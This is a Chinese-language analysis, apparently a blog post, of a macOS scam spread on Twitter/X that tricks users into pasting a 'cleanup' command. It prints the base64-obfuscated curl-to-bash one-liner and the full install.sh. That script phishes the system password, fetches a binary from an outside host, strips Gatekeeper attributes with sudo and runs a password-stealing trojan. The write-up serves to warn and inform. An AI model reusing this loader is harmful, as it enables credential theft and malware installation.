[TOC]

## 1.诱导

 从twitter(x)上看到的，默认获得官方认证，打着清理垃圾的幌子，引导打开它的网站

 从mac上看到的样子如下：
![image.png](https://s2.loli.net/2025/08/11/y8cAd9BGfPN4Fmh.png)

从windows上看到的如下：

![image.png](https://s2.loli.net/2025/08/11/XVNCH2pyDrewWYB.png)

从移动端看到的如下：
![image.png](https://s2.loli.net/2025/08/11/1JNbC4UGLEoOrKq.png)



## 2.执行脚本（先诱导用户输入密码，再下载恶意二进制文件，利用密码开权限绕过检查并执行）

```shell
/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly96ZWVuaW9zLmNvbS90dy9pbnN0YWxsLnNo | base64 -d))"
base64解码(`https://zeenios.com/tw/install.sh`)-->下载脚本-->执行脚本


~/desktop/sh  $ cat install.sh
#!/bin/bash

username=$(whoami)  #获取当前用户名

while true; do #用命令行的方式，让用户循环输入密码
  echo -n "System Password: "
  read password
  echo
  
  #检查输入的密码是否正确
  if dscl . -authonly "$username" "$password" >/dev/null 2>&1; then
    echo -n "$password" > /tmp/.pass    #密码明文写入 /tmp/.pass (/tmp是放临时文件的公共区域)
    break
  else
    echo "Incorrect password! Try again."
  fi
done
#从 zeenios.com 下载一个叫 update 的二进制文件到 /tmp/update
curl -o /tmp/update https://zeenios.com/tw/update >/dev/null 2>&1
#用刚才输入的密码执行 sudo（管理员权限）命令，去清除 /tmp/update 文件的扩展属性（比如 macOS Gatekeeper 的安全标记），绕过系统的安全检查，防止 macOS 阻止这个程序运行
echo "$password" | sudo -S xattr -c /tmp/update >/dev/null 2>&1
#给/tmp/update 添加执行权限，然后直接运行它（可能是病毒、木马、远程控制程序）
chmod +x /tmp/update
/tmp/update%   
```

## 3.二进制文件

update文件
使用`VirusTotal(https://www.virustotal.com)`分析如下：

![image.png](https://s2.loli.net/2025/08/11/YHiksTyMNgCSqQn.png)

 像业界著名的厂商（`ALYac`,`AVG`,.....）均检测出恶意，**Trojan-PSW**（密码窃取木马）

 **Trojan-PSW（密码窃取木马）**
 **MacOS:Stealer-CH [Pws]**

**Gen:Variant.MAC.Amos.8**

 **OSX/InfoStl-ER**

全都是窃取密码的报警